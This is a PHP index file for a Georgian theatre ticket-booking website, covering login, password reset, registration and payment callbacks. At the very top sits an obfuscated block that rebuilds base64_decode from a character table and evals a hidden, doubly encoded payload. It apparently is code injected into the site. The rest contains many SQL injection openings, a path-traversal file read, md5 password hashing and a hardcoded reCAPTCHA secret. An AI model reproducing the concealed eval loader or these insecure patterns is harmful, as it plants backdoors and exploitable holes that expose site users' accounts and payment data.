<?php $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}    
        .$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}    
        .$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};    
        eval($O00O0O("JE8wTzAwMD0iRXhmVUFCR3VtZFR2em55Y2VKWVJwVk10cWpGSVNhcmtEUEtDSFhoV05PZ3Nab2x3UWlMYmxVcVBtTkVrek1DZUJJYVpyZ1ZTS1FHeVlkWHVMVEFidmluT2Z0RnNSREp4aFdIcHdvY2ppdjlwVGZtbk96aDFqelIwVHM5a3VmTldNc2dldDI1Rmp6WlduTE43T29tSnVPTktob21XdXNReVpmUzVuT1NxUDBRTFFiUUxzYU11UVhTd3QwUkdMUFFEUVg5Z1BPTU1uTGJKcnBXSnVPbUp1T21KdWZnSE1mUWFqb21idDFSWFBIaFhQSHhJTFhTUFBYOXZDbEhYQ0hTcUxRbUl0Q3hudU9tSnVmMEpoc1VCaHNIenVPSkZoczFwTWZiV2dYOUNTUWdzU1FnamcwRlBRWE5xc1g5RUMxZ3R3UWdsU1BTcVNiOUxnMTBLbkxON09vbUp1T21KdU9tSlp6UTBNdGdrdU9TcVAwUUxRYlFMc2FNdVFYU3d0MUZxU2I5TFEwWExTbFFsdDBoaVBvTU1EcFdKdU9tSnFMTkhqZlJIdWZ4bnVPbUp1T21KdU9OYWh0UzFaejRKZ1g5Q1NRZ3NTUWdqZzFnWENQOVBTUTlOU2xTTGcxMDdPb21KdU9OOU9JMG5PemgxanpSMFRzOWt1RVJXVnRRcVYySG9Wc2JXbkxON09vbUp1T21iTXRSSFpiWEloczUwdXYwSlozU2FNRTl4ajNNSFpvSmJ0MVJYUEhoWFBIeElMWFNQUFg5UVAwUUx0MFhmU1A1UGcxMEtEcFdKdU9tSmdFZ2VNZkdKaUxOak9vbUp1T21KdU9tSmcyTWVqMk14aHNnZU1PWnh1T01vVHM1SVZ6OTBnYXBKZzNSeE10Z3BnYXBKZzJTMVYyeWJNc1JBVno5MGdhcEpnMmdGVHNTMVozTktoRVFhZ2FwSmczSEZqelNIckVnZU1PWnhPb21KdU9tSnVPbUpnMmhGVjJRb2ozd0ljT21JaHpYZGhzZ2VqMnlIcmZTSFp6NUZqRUZLTU9aeHVPTUtWUTlGWnpSV1R0aEhab1p4dU9NeVRkbGFWejkwZ2FwSmczUkhqdGcxWjJGb2ozd0ljbVdKdU9tSnVPbUp1T01hajJNSFp6Z2VNT1p4dU9NRlRmZ0hoSVJvajN3SWNPbUlaM05vajN3SWNPbUlaRUhrTUVRYWh0UjBWejkwZ2FwSmcyVUtqenlIaEVIa1Z6OTBnYXBKZzNTSGpFUUlaelh5Vno5MGdhcG51T21KdU9tSnVPbUlNZk1LTWZTSFp6Z2VNT1p4dU9NRlpmTnhoc2dlTU9aeHVPTUlqMjlJakVRb2ozd3lqczlvVHNVSGdwV0p1T21KdEN4bk9vbUp1T056ajNnSFZzUld1T0piVno5MFphTkZaYW1iVno5MG5MTjdPb21KdU9tSnVPbUpUc1ZKbmZSMFpJTmVaYUpiTXRSSFpiWEloczUwY09tYlZ6OTBuTG1GaUMwSmh6WHhaMlBLdWZ4bnVPbUp1T21KdU9tSnVPbUpaelEwTXRna3VmU2FNc1A3T29tSnVPbUp1T21KcXdXSnVPbUpxd1dudU9tSnVPU29qM1N1aHNYYmh0Z0J1djBKc2FNNGNzaGVaSU1GWnpTSGhPMXpqM3VJY09tSU16SEZnYXBKZzJSeFRzUWtNTzFLWk9aeHVPTTRjdGdIVnNweVR0bUl0Q3hudU9tSnVFaGVaelFGVjJKSm5PU29qM1N1aHNYYmh0Z0J1RVhCdU9TV2hzWGJodHVLdWZ4bnVPbUp1T21KdU9OS2hvbVdUdFJCaHR3V2dYOUNTUWdzU1FnamdFRkhWc1NIWkgwS25MTjdPb21KdU9tSnVPbUp1T21KdWZnSE1mUWFqb04wWklRSERwV0p1T21KdU9tSnVmMG51T21KdWYwbk9vbUp1T05haHRTMVp6NEpoelh4WjJQN09JMG5jYTlIanpTcGoySGtNT21lYzNORlozU0tUMlhrdUVSMVp6cEpDMDRuaElRa1YzU0tqMjRKakVYa3QyUktWdFBXZ0VIcG5MTjdPb21KdU9tYk10Z3h1djBKZzJGME1mbTZjYTlLWk8xRlpFYmtWMjl5YzJLQmoyNGVnYW1rdU9TS1p2eG51T21KdU9TZFRPbTl1RVIxWnpVcVRzNUtNT0piTXRneG5DeG51T21KdUVSMVp6VXFaMlEwajNOMG5PU2RUT3BKdzFRTENsOXdRWDlMU1FTUVBiNVBQYlhEUDBoWFBvcEpNZmcxaExiN09vbUp1T21iWnpRQlpFOWtaMlBKaUxOZE10Z3h0MlE0aHNHV2dFUlduQ3hudU9tSnVFUjFaelVxVjJVZVoyUFdnRVJXbkN4bnVPbUp1RUh6dU9KYlp6UUJaRTlrWjJQSmlDMDl1RWhGamZSSG5MTjdPb21KdU9tSnVPbUpaelEwTXRna3VFNTFqRXA3T29tSnVPTjlPb21KdU9OYWh0UzFaejRKVElSZWpIOWJoc1JlaEVQV2dmZ0haM05laklSSGNPTjBaSVFIbkN4bnF3V2JNekhCVHRTZVpIOUtaT205dWZOV01zZ2V0MjVGanpaV25DeG5nZmdIWjNReE1PbTl1RVVGakg5ZFRzWDFuT1MyVHRSS01FOWF0MkhwbkN4bk9vOGVoMlhrTUViSnJmRjRyZkpKVDJQSk10Z3hPekh6dU9KYlp6UUJNc1UwbkxON09vbUp1T21iVjI5MWpJU2FyTG05dUVIQloyUTBuT1NhaHRSMWpmU2pnMlJlTXM1MFpJYkl0TGJKaWFtYlp6UUJNc1Uwc2FNZGozUWtNZmc1ZzEwSkRvbUlRczVBano5M2pvWjdPb21KdU9OS2hvbVdnRVJlTXM1MFpJYkppQzA5dU9NZ2p6U2VqelFCVHNsSW5MTjdPb21KdU9tSnVPbUpURVFGaEVRYW5PZ0dqMlJGTUVIZWpkV0pUZlMwWmZHNmNhOUZqdE5XTUUxeGp6SFdWejlCY0lTZVpPOTBoc2xldW9wSk1mZzFoTHBKR0JtVW5DeG51T21KdU9tSnVPTkhyRUgwbk9iN09vbUp1T045T0kwbk96SHp1T0ZkVEVYMXQyUktWelhLbk9iS3VmeG51T21KdUVGSFZzU0hab0pvQ0U5ZFZ0U0tqMjQ2dUVGME1mTkJEbzhlVnMxcFRmU3lqRTVLVEVnZVphNTBqM21lTUVRRmNhdXh1ZlNhTXNQeHV2R3BHTGI3T29tSnVPTkhyRUgwbk9iN09JMG5PZDgrIjsgIAogICAgICAgIGV2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksICAgIAogICAgICAgICRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>

<?php session_start();


if (isset($_GET["m"]) and $_GET["m"]=="js"){
    if (file_exists("../js/".$lang)){
        $js= file_get_contents("../js/".$lang);
        echo $js;
    }
    exit;
}

if (isset($_GET["m"]) and $_GET["m"]=="html"){
    if (file_exists("../html/".$lang)){
        $js= file_get_contents("../html/".$lang);
        echo $js;
    }
    exit;
}



$current_uri = $_SERVER['REQUEST_URI'];
$is_static_asset = preg_match('/.(?:png|jpg|jpeg|gif|css|js|map|ico)$/', $current_uri); 

$exclude_pattern = '/CSS/jquery/'; // Regular expression to exclude URLs containing "CSS/jquery"

$m1["view_item"] = "";
if (!$is_static_asset && !preg_match($exclude_pattern, $current_uri) && strpos($current_uri, 'login') === false && strpos($current_uri, 'booking_func') === false && strpos($current_uri, 'logout') === false && strpos($current_uri, 'loginfail') === false) {
    $_SESSION["saved_addr"] = $current_uri;
}


if (isset($_GET["qrreader"])){
    include "qrreader.php";
    exit;
}

if (isset($_GET["m"]) and $_GET["m"]=="qr"){
    include "qr.php";
    exit;
}

$breadcrumbList = [
    '@context' => 'http://schema.org',
    '@type' => 'BreadcrumbList',
    'itemListElement' => []
];




$user_id=0;
$fbid=0;

$main_domain="https://teatri.ge";

include "phpmailer/phpmailer.php";
include "includes/config.php";
include "includes/func.php";
include "sms.php";
$lang = 1;

$lang_names[1]="";
$lang_names[2]="en";

$lang_ukugma[""]=1;
$lang_ukugma["en"]=2;

$mdate=date("Y-m-d H:i:s");
$json_date=$mdate;




    $q="SELECT p_link, front_id FROM articles WHERE p_link IS NOT NULL and p_link!='' and p_link!=front_id ";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));

    for ($i=0;$i<mysqli_num_rows($r);$i++){
        $p_link=mr($r, $i, "p_link");
        $front_id=mr($r, $i, "front_id");



        $q="UPDATE articles SET front_id='$p_link' WHERE front_id='$front_id'";
        mysqli_query($conn, $q) or die(mysqli_error($conn));

    }


    


if (isset($_GET["m"])){
    $check=hack_check($_GET["m"]);
    $q="SELECT * FROM articles WHERE p_link LIKE '$check' and cat!='10'";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    if (mysqli_num_rows($r)>0){
        $cat=mr($r, 0, "cat");
        $front_id=mr($r, 0, "front_id");
        if ($cat==8){
            $_GET["m"]="newsandblog";
        } elseif ($cat==1121){
            $_GET["m"]="booking";
        } elseif ($cat==1){
            $_GET["m"]="articles";
            $pid = mr($r, 0, "pid");
        }elseif ($cat==111){
            $_GET["m"]="aboutuspage";
        }

        $_GET["id"]=$front_id;
    }

    
}






if (isset($_GET["m"]) and $_GET["m"]=="tickets"){
    include "tickets.php";
    exit;
}

if (isset($_GET["m"]) and $_GET["m"]=="invoice"){
    include "invoice.php";
    exit;
}


ini_set('display_errors',0); 



if (isset($_GET["m"]) and $_GET["m"]=="booking_func"){
    include "booking_func.php";
    exit;
}

if (isset($_GET["m"]) and $_GET["m"]=="booking_func_spec"){
    include "booking_func_spec.php";
    exit;
}

if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {$cur_url = "https://";} else {$cur_url = "http://";}
$cur_url.= $_SERVER['HTTP_HOST'];   
$cur_url.= $_SERVER['REQUEST_URI']; 
	
$m1["meta_name"]="";
$m1["meta_description"]="";
$m1["content"]="";
$m1["error"]="";$m1["refresh"]="";$m1["script"]="";
if (!isset($_SESSION["lang"]) or $_SESSION["lang"]==""){$_SESSION["lang"]=1;}
if (isset($_GET["lang"])){
    $lang=hack_check($_GET["lang"]);
    if ($_GET["m"]=="js"){
        if (file_exists("../js/".$lang)){
            $js= file_get_contents("../js/".$lang);
            echo $js;
        }
       
        exit;
    }
    
    if ($lang==""){$lang=1;}
    else {
        if ((int)($lang)!=$lang){
            $lang=$lang_ukugma[$lang];
        }
    }
    $_SESSION["lang"]=$lang;
}
if($_SESSION["lang"] != 0 && $_SESSION["lang"] != ""){
$lang=$_SESSION["lang"];
}

if (isset($_GET["m"])){
    $m_lang=hack_check($_GET["m"]);
    if($m_lang=="en"){ 
    $lang=2;
    $cmenu="home";}
}

if($lang == 1){
    $breadname = 'მთავარი გვერდი';
}
else{
    $breadname = 'Main Page';
}

$breadcrumbItem = [
    '@type' => 'ListItem',
    'position' => 1,
    'item' => [
        '@id' => $main_domain ,
        'name' =>  $breadname
    ]
];
array_push($breadcrumbList['itemListElement'], $breadcrumbItem);


$r=mysqli_query($conn, "SELECT mystr.str_name, mystr.str_value 
                        FROM mystr
                        INNER JOIN langs ON langs.id=mystr.lang 
                        WHERE mystr.lang='$lang' and langs.status='1' ORDER BY mystr.id ASC") or die(mysqli_error($conn));
for ($i=0;$i<mysqli_num_rows($r);$i++){
    $str_name=mr($r, $i, "str_name");
    $str_value=mr($r, $i, "str_value");
    $str[$str_name]=$str_value;
}
    
if (isset($_GET["m"]) and $_GET["m"]=="tpay_return"){
   
    include "tpay_return.php";
    exit;
}
if (isset($_GET["m"]) and $_GET["m"]=="tpay_callback"){
    include "tpay_callback.php";
    exit;
}

if (isset($_GET["qr"])){
    include "qr.php";
    exit;
}

if (isset($_GET["ajax"])){
    include "ajax.php";
}
if (isset($_GET["bog_callback"])){
        include "bog_callback.php";
        exit;
}



if (isset($_GET["bog_fail"])){
    if (isset($_SESSION["trans_id"])){
        $mdate=date("Y-m-d H:i:s");
        $trans_id=$_SESSION["trans_id"];
        
        $q="UPDATE orders SET is_payed='-1', is_booking='0' WHERE trans_id='$trans_id'";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
        $q=str_replace("'", "", $q);
     
        $h = fopen('files/bog_log.txt', 'a'); 
        fwrite($h, "n UARYOFITI pasuxi movida $mdate n"); 
        fwrite($h, 'fail: ' . $_SESSION["trans_id"] . "n"); 
        fwrite($h, 'query: ' . $q . "n"); 
        
        fclose($h); 

        $q="UPDATE payreq SET payed='-1'  WHERE order_id='$trans_id'";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
        unset($_SESSION["trans_id"]);
        $q=str_replace("'", "", $q);
        mysqli_query($conn, "INSERT INTO logs (user_id, query, mdate) VALUES ('$user_id', '$q', '$mdate')" ) or die(mysqli_error($conn));
        echo "<Script>document.location.href='/profile';</script>";

        exit;
    } else {
        $h = fopen('files/bog_log.txt', 'a'); 
        fwrite($h, "n (NO TRANS) UARYOFITI pasuxi movida $mdate n"); 
        fwrite($h, 'IO REQ: ' . $reque . "n"); //write the output text
        fwrite($h, 'QUERY_STRING: ' . $_SERVER["QUERY_STRING"] . "n"); //write the output text
        fwrite($h, 'ConfirmRequest: ' . print_r($_REQUEST, true) . "n");
        fwrite($h, 'GET: ' . print_r($_GET, true) . "n");
        fwrite($h, 'POST: ' . print_r($_POST, true) . "n");
        fclose($h); 
        echo "<Script>document.location.href='/profile';</script>";

        exit;

    }
}

if (isset($_GET["bog_success"])) {
    if (isset($_SESSION["trans_id"])) {

        $left_displace = $_SESSION["left_displace"];
        $trans_id = $_SESSION["trans_id"];
        $pc_id = isset($_SESSION["pc_id"]) ? $_SESSION["pc_id"] : null;

        if (isset($_SESSION["other_person"])) {
            $sql = ", rname='"  . $_SESSION["ot_fname"] . "'";
            $sql .= ", rname2='" . $_SESSION["ot_sname"] . "'";
            $sql .= ", remail='" . $_SESSION["ot_email"] . "'";
            $sql .= ", rphone='" . $_SESSION["ot_phone"] . "'";
        } else {
            $sql = "";
        }

        $mdate = date("Y-m-d H:i:s");

        $q = "UPDATE orders SET is_payed='1', is_booking='0', pay_date='$mdate' WHERE trans_id='$trans_id'";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $q = str_replace("'", "", $q);

        $h = fopen('files/bog_log.txt', 'a'); 
        fwrite($h, "n pasuxi movida $mdate n"); 
        fwrite($h, 'success: ' . $_SESSION["trans_id"] . "n"); 
        fwrite($h, 'query: ' . $q . "n"); 
        fclose($h);

        mysqli_query($conn, "INSERT INTO logs (user_id, query, mdate) VALUES ('$user_id', '$q', '$mdate')") or die(mysqli_error($conn));

        $q = "UPDATE payreq SET payed='1'" . $sql . ", pc_id='$pc_id' WHERE order_id='$trans_id'";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        unset($_SESSION["trans_id"]);
        $q = str_replace("'", "", $q);
        mysqli_query($conn, "INSERT INTO logs (user_id, query, mdate) VALUES ('$user_id', '$q', '$mdate')") or die(mysqli_error($conn));

        $q = "SELECT * FROM pcodes WHERE id='$pc_id'";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $pc_left = mr($r, 0, "pc_left");
        $pc_left = $pc_left - 1;
        $q = "UPDATE pcodes SET pc_left='$pc_left' WHERE id='$pc_id'";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        unset($_SESSION["pc_price"]);

        $q = "SELECT * FROM orders WHERE trans_id='$trans_id' LIMIT 1";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $event_id = mr($r, 0, "event_id");

        $q = "UPDATE articles SET displace=$left_displace WHERE id = '$event_id' ";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        unset($_SESSION["left_displace"]);
        unset($_SESSION["displace"]);

        $q = "SELECT * FROM payreq WHERE order_id='$trans_id'";
        $rpay = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $user_id = mr($rpay, 0, "userid");

        $q = "SELECT * FROM users WHERE id ='$user_id'";
        $ruser = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $email = mr($ruser, 0, "email");
        $phone = mr($ruser, 0, "phone");

        if (isset($_SESSION["other_person"])) {
            if (isset($_SESSION["ot_email"]))
                $email = $_SESSION["ot_email"];
            if (isset($_SESSION["ot_phone"]))
                $phone = $_SESSION["ot_phone"];
        }

        $url = "https://teatri.ge/tickets?id=$trans_id"; // Sample URL, replace it with the real URL if different        

        $mp5['body'] = "<br/> <br/>თქვენ წარმატებით შეიძინეთ ბილეთები! <br/> გისურვებთ წარმატებებს! <br/><br/>";
        $mp5['buy'] = "<a href= $url target='_blank'; style='color:#141414; width: 300px;text-decoration: none; line-height:40px ; display: block; font-family: Arial, Helvetica, sans-serif; font-size: 20px; background-color:#CABEA3 '>ბილეთები</a>";
        
        $body = load_template("mailer", $mp5);

        $message = "თქვენ წარმატებით შეიძინეთ ბილეთები! {$url} შეკვეთის დადასტურება ასევე გამოგზავნილია მისამართზე: {$email} გისურვებთ წარმატებებს!";

        $destination = $phone;  // The recipient's phone number
        $response = $senderGe->sendSms(1, $destination, $message);
        Send_Mail2($body, $email, "თქვენი შეკვეთა დადასტურებულია");

        $body = "საიტზე განხორციელდა ახალი გაყიდვა";
        $email = "Info@tsiskvili.ge";
        Send_Mail2($body, $email, "ახალი გაყიდვა");

    } else {
        $h = fopen('files/bog_log.txt', 'a'); 
        fwrite($h, "n (NO TRANS) DADEBITI $mdate n"); 
        fwrite($h, 'IO REQ: ' . $reque . "n");
        fwrite($h, 'QUERY_STRING: ' . $_SERVER["QUERY_STRING"] . "n");
        fwrite($h, 'ConfirmRequest: ' . print_r($_REQUEST, true) . "n");
        fwrite($h, 'GET: ' . print_r($_GET, true) . "n");
        fwrite($h, 'POST: ' . print_r($_POST, true) . "n");
        fclose($h);
    }
    echo "<Script>document.location.href='/profile';</script>";
    exit;
}


if (isset($_GET["cmp_success"])) {
    if (isset($_SESSION["trans_id"])) {
        $trans_id = $_SESSION["trans_id"];
        $pc_id = isset($_SESSION["pc_id"]) ? $_SESSION["pc_id"] : null;
        $mdate = date("Y-m-d H:i:s");
        $left_displace = $_SESSION["left_displace"];
        $inv_code = generate7DigitCode();

        $unique = 0;
        while ($unique == 0) {
            $rpy = mysqli_query($conn, "SELECT * FROM payreq WHERE invoice_code='$inv_code' ") or die(mysqli_error($conn));
            if (mysqli_num_rows($rpy) > 0) {
                $inv_code = generate7DigitCode();
            } else {
                $unique = 1;
            }
        }

        $q = "SELECT * FROM payreq WHERE order_id='$trans_id'";
        $rpay = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $user_id = mr($rpay, 0, "userid");

        if ($user_id == 145) {
            $q = "UPDATE orders SET is_payed='1', pay_date='$mdate', reserve_date='$mdate', invoice_code='$inv_code' WHERE trans_id='$trans_id'";
            $r = mysqli_query($conn, $q) or die(mysqli_error($conn));

            $q = "UPDATE payreq SET payed='1', invoice_code='$inv_code', pc_id='$pc_id' WHERE order_id='$trans_id'";
            $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
            unset($_SESSION["trans_id"]);
        } else {
            $q = "UPDATE orders SET is_payed='2', pay_date='$mdate', reserve_date='$mdate', invoice_code='$inv_code' WHERE trans_id='$trans_id'";
            $r = mysqli_query($conn, $q) or die(mysqli_error($conn));

            $q = "UPDATE payreq SET payed='2', invoice_code='$inv_code', pc_id='$pc_id' WHERE order_id='$trans_id'";
            $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
            unset($_SESSION["trans_id"]);
        }

        $q = "SELECT * FROM orders WHERE invoice_code='$inv_code' LIMIT 1";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $event_id = mr($r, 0, "event_id");

        $q = "UPDATE articles SET displace=$left_displace WHERE id = '$event_id' ";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        unset($_SESSION["left_displace"]);
        unset($_SESSION["displace"]);

        $q = "SELECT * FROM pcodes WHERE id='$pc_id'";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $pc_left = mr($r, 0, "pc_left");
        $pc_left = $pc_left - 1;
        $q = "UPDATE pcodes SET pc_left='$pc_left' WHERE id='$pc_id'";
        $r = mysqli_query($conn, $q) or die(mysqli_error($conn));
        unset($_SESSION["pc_price"]);

        $q = "SELECT * FROM users WHERE id ='$user_id'";
        $ruser = mysqli_query($conn, $q) or die(mysqli_error($conn));
        $email = mr($ruser, 0, "email");
        $phone = mr($ruser, 0, "phone");

        $url = "https://teatri.ge/invoice?id='$inv_code"; // Sample URL, replace it with the real URL if different        

        $mp5['body'] = "<br/> <br/>თქვენი კომპანიისთვის დაგენერირდა ინვოისი. <br/><br/>გთხოვთ 2 საათის განმავლობაში თანხა ჩარიცხოთ სრულად, წინააღმდეგ შემთხვევაში გაუქმდება ჯავშანი. თანხის ჩარიცხვის შემდეგ, დასადასტურებლად, აუცილებელია დაუკავშირდეთ თეატრის რეზერვაციების მენეჯერს ნომერზე: +995 577 00 08 88. ";
        $mp5['buy'] = "<a href= $url; target='_blank'; style='color:#141414; width: 300px;text-decoration: none; line-height:40px ; display: block; font-family: Arial, Helvetica, sans-serif; font-size: 20px; background-color:#CABEA3 '>ინვოისი</a>";
        
        $body = load_template("mailer", $mp5);

        $message = "გთხოვთ 2 საათის განმავლობაში თანხა ჩარიცხოთ სრულად, წინააღმდეგ შემთხვევაში გაუქმდება ჯავშანი.თანხის ჩარიცხვის შემდეგ, დასადასტურებლად, აუცილებელია დაუკავშირდეთ თეატრის რეზერვაციების მენეჯერს ნომერზე: +995 577 00 08 88. {$url}!";

        $destination = $phone;  // The recipient's phone number
        $response = $senderGe->sendSms(1, $destination, $message);
        Send_Mail2($body, $email, "დაგენერირდა ინვოისი");

        $message = "კომპანიის ანგარიშით დაგენერირდა ბილეთები.  იყავი ყურადღებით";
        $response = $senderGe->sendSms(1, '+995 555 144 023', $message);
        $response = $senderGe->sendSms(1, '+995 577 000 888', $message);

        $body = "საიტზე განხორციელდა ახალი გაყიდვა";
        $email = "Info@tsiskvili.ge";
        Send_Mail2($body, $email, "ახალი გაყიდვა");
    }
    echo "<Script>document.location.href='/profile';</script>";
    exit;
}



if (isset($_GET["logout"])){
    unset($_SESSION["user_id"]);
    if (isset($_SESSION["saved_addr"])){
        echo "<script>document.location.href='".$_SESSION["saved_addr"]."';</script>";
    } else {
        echo "<script>document.location.href='?';</script>";
    }
    exit;
}

$m5["displayb"]="none";

if(isset($_GET["resetpassword"])){
    $m5["displayb"]="block";
}

$m5["displays"]="none";

if(isset($_GET["reset"])){
    $m5["displays"]="block";
}

if(isset($_GET["email"])){
    if($lang == 1){
        $m1["error"] = "გთხოვთ შეამოწმოთ მეილი";
    }else{
        $m1["error"] = "please check email";
    }
}

if (isset($_GET["respas"])){
    ini_set('display_errors',1); 


    $email=hack_check($_POST["email"]);
    if($email==""){
        
        if($lang == 1){
                    echo '<script>alert("გთხოვთ შეავსოთ მეილი");</script>';
                }else{
                    echo '<script>alert("please fill email");</script>';
                }        
        echo "<script>document.location.href='?resetpassword';</script>";
    }else{
        
        $q="SELECT id FROM users WHERE email='$email' LIMIT 1";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
        if (mysqli_num_rows($r)>0){
            
            $respas=generateRandomString(8);
            $r=mysqli_query($conn, "UPDATE users SET temporary_id='$respas' WHERE email='$email'") or die(mysqli_error($conn));
            //$headers = 'Return-Path: uabashidze@gmail.com' ."rn";
            //$headers = 'From: uabashidze@gmail.com' . "rn";
            

           // echo "<script>document.location.href='?email';</script>";
            
            $mp5['body']="<br/> <br/> პაროლის აღსადგენად <br/><br/>დააჭირეთ ქვემოთ მოცემულ ბმულს.";
            $mp5['buy']="<a href='https://teatri.ge/?rp=$respas''; target='_blank'; style='color:#141414; width: 300px;text-decoration: none; line-height:40px ; display: block; font-family: Arial, Helvetica, sans-serif; font-size: 20px; background-color:#CABEA3 '>პაროლის აღდგენა</a>";
            
            $body=load_template("mailer",$mp5);
        
            Send_Mail2($body,$email,"password reset from Teatri.ge");
            echo "<script>document.location.href='?email';</script>";
            exit;

        } else {
            
            if($lang == 1){
                echo '<script>alert("მითითებული მეილი არ მოიძებნა");</script>';
            }else{
                echo '<script>alert("incorrect email");</script>';
            }      
            echo "<script>document.location.href='?resetpassword';</script>";
        }
    

    }
    exit;
}



$m5["displayres"]="none";

if (isset($_GET["rp"])){
    $temporary_id = $_GET["rp"];

    $m5["displayres"]="block";
    $m5["temporary_id"] = $temporary_id;
    if(isset($_GET["respas2"])){

    $q="SELECT email FROM users WHERE temporary_id='$temporary_id' LIMIT 1";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));

    $email = mr($r, 0, "email");
    $pass=hack_check($_POST["pass"]);
    $repeat_pass=hack_check($_POST["repeat_pass"]);
    
    if($pass == $repeat_pass){
    $q="SELECT id FROM users WHERE email='$email' LIMIT 1";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    if (mysqli_num_rows($r)>0){
        $respas=md5($pass);
        //$respas=generateRandomString(8);
        $r=mysqli_query($conn, "UPDATE users SET upass='$respas', temporary_id=null WHERE email='$email'") or die(mysqli_error($conn));

       // $headers = 'Return-Path: uabashidze@gmail.com' ."rn";
       // $headers = 'From: uabashidze@gmail.com' . "rn";
       $m1["error"]="პაროლი წარმატებით შეიცვალა";

       echo "<script>document.location.href='?reset';</script>";
      
    } 
}
else
{
    echo '<script>alert("არასწორი პაროლია");</script>'; 
    echo "<script>document.location.href='?rp=1';</script>";

}
    exit;
}}


if (isset($_GET["login"])){
    $email=hack_check($_POST["email"]);
    $pass=hack_check($_POST["pass"]);

    $upass=md5($pass);
    
    $q="SELECT id FROM users WHERE email='$email' and upass='$upass' LIMIT 1";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    if (mysqli_num_rows($r)>0){
        $_SESSION["user_id"]=mr($r, 0, "id");
        if (isset($_SESSION["saved_addr"])){
            echo "<script>document.location.href='".$_SESSION["saved_addr"]."';</script>";
        } else {
            echo "<script>document.location.href='?';</script>";
        }

    } else {
        echo "<script>document.location.href='?loginfail';</script>";
    }
    exit;
}

if (isset($_GET["fblogin"])){
    $fbid=hack_check($_GET["fblogin"]);
    $fbname=hack_check($_GET["name"]);
     
    $q="SELECT id FROM users WHERE fbid='$fbid'";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    if (mysqli_num_rows($r)>0){
        $_SESSION["user_id"]=mr($r, 0, "id");
    } else {
        $email="";
        $mdate=date("Y-m-d H:i:s");
        $q="INSERT INTO users (fbid, pname, email, utype,alevel,status,mdate) VALUES ('$fbid', '$fbname', '$email', '0', '10', '1', '$mdate' ) ";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
        $q="SELECT id FROM users ORDER BY id DESC LIMIT 1";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
        $_SESSION["user_id"]=mr($r, 0, "id");
    }
}

if (isset($_SESSION["user_id"])) {
    unset($_SESSION["saved_addr"]);
}


$m5["displayerror"]="none";

if (isset($_GET["loginfail"])){

    $m5["displayerror"]="block";


}



if (isset($_GET["reg_email"])){
    $m1["error"]="{s_reg_email}";

}


if (isset($_GET["reg"])){
    $recaptchaSecret = '6LcG5cwnAAAAAKfl1gPRzZLDC-iwH-ZlNju5bL0G';  // Replace with your actual secret key
    $recaptchaResponse = $_POST['g-recaptcha-response'];

    // Make and check POST request
    $recaptcha = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=' . $recaptchaSecret . '&response=' . $recaptchaResponse);

    if ($recaptcha === false) {
        die('Unable to reach Google reCAPTCHA servers.');
    }

    $recaptchaKeys = json_decode($recaptcha, true);
    
    if ($recaptchaKeys === null) {
        die('Failed to decode reCAPTCHA JSON.');
    }


    if(intval($recaptchaKeys["success"]) !== 1) {
        $m1["error"]="{s_captcha}";
    } 
    else{
    $email=hack_check($_POST["email"]);
    $pname=hack_check($_POST["pname"]);
    $pass=hack_check($_POST["pass"]);
    //$pers_id=hack_check($_POST["pers_id"]);
    $phone=hack_check($_POST["phone"]);
    $repeat_pass=hack_check($_POST["repeat_pass"]);
    $fail=0;
    $timenow=date('Y-m-d H:i:s');
    if ($pass!=$repeat_pass){
        echo "paroli ar emtxveva";
        $fail=1;
    }
    $q="SELECT id FROM users WHERE email='$email' LIMIT 1";
    $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
    if (mysqli_num_rows($r)>0){
        $fail=1;
        echo "<script>document.location.href='?reg_email';</script>";
    }
    if ($fail==0){
        $upass=md5($pass);
        $q="INSERT INTO users (pname, email,  upass,utype,alevel,status,mdate, phone) VALUES ('$pname', '$email','$upass', '0', '10', '1', '$timenow', '$phone') ";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
        $q="SELECT id FROM users ORDER BY id DESC LIMIT 1";
        $r=mysqli_query($conn, $q) or die(mysqli_error($conn));
     
        $_SESSION["user_id"]=mr($r, 0, "id");

